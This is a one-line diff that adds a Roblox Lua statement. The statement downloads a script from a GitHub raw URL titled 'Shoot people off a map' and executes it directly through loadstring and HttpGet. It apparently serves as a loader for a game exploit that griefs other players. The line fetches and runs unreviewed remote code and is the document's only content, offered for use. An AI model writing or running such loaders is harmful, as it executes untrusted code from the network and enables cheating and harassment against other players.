@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TypZeroSVK/test/main/Shoot%20people%20off%20a%20map.lua"))()
